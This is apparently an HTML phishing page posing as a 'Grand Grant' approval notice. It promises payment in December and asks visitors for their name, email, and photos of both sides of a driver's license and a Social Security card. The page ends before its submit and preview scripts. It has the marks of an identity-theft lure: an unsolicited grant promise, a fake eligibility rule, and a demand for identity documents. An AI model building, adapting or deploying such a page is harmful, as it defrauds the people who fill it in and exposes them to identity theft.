<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grand Grant Application Upload</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #f8f9fa;
    }

    .container {
      max-width: 600px;
      margin: 50px auto;
      padding: 20px;
      background: #fff;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
    }

    h2, h3 {
      text-align: center;
      color: #333;
    }

    .notice {
      background: linear-gradient(135deg, #ffdd57, #ff6f61);
      color: white;
      text-align: center;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-weight: bold;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      font-size: 1.5em;
    }

    .hidden {
      display: none;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 5px;
    }

    input[type="text"], input[type="email"], input[type="file"], button {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      background: royalblue;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: darkblue;
    }

    .info {
      color: #555;
      font-size: 0.9em;
      margin-bottom: 20px;
    }

    .preview {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 20px;
    }

    .preview img {
      max-width: 100%;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .confirmation {
      color: green;
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <!-- Notice Section -->
  <div class="container">
    <div class="notice">
      ðŸŽ‰ Exciting News! Your Grand Grant will be paid in the first week of December! ðŸŽ‰
    </div>
  </div>

  <!-- Form Section -->
  <div class="container hidden" id="formContainer">
    <h2>Grand Grant Approved Application</h2>
    <p class="info">* Eligibility Requirement: Minimum credit score of 750 *</p>
    <form id="grantForm">
      <div class="form-group">
        <label for="name">Full Name:</label>
        <input type="text" id="name" name="name" placeholder="John Doe" required>
      </div>
      <div class="form-group">
        <label for="email">Email Address:</label>
        <input type="email" id="email" name="email" placeholder="example@domain.com" required>
      </div>
      <div class="form-group">
        <label for="dlFront">Driver's License (Front):</label>
        <input type="file" id="dlFront" name="dlFront" accept="image/*" required onchange="previewImage('dlFront', 'previewDlFront')">
        <div id="previewDlFront" class="preview"></div>
      </div>
      <div class="form-group">
        <label for="dlBack">Driver's License (Back):</label>
        <input type="file" id="dlBack" name="dlBack" accept="image/*" required onchange="previewImage('dlBack', 'previewDlBack')">
        <div id="previewDlBack" class="preview"></div>
      </div>
      <div class="form-group">
        <label for="ssnFront">SSN Card (Front):</label>
        <input type="file" id="ssnFront" name="ssnFront" accept="image/*" required onchange="previewImage('ssnFront', 'previewSsnFront')">
        <div id="previewSsnFront" class="preview"></div>
      </div>
      <div class="confirmation" id="confirmation" style="display: none;">
        Images uploaded successfully! Click Submit to proceed.
      </div>
      <button type="button" onclick="submitForm()">Submit Application</button>
    </form>
  </div>
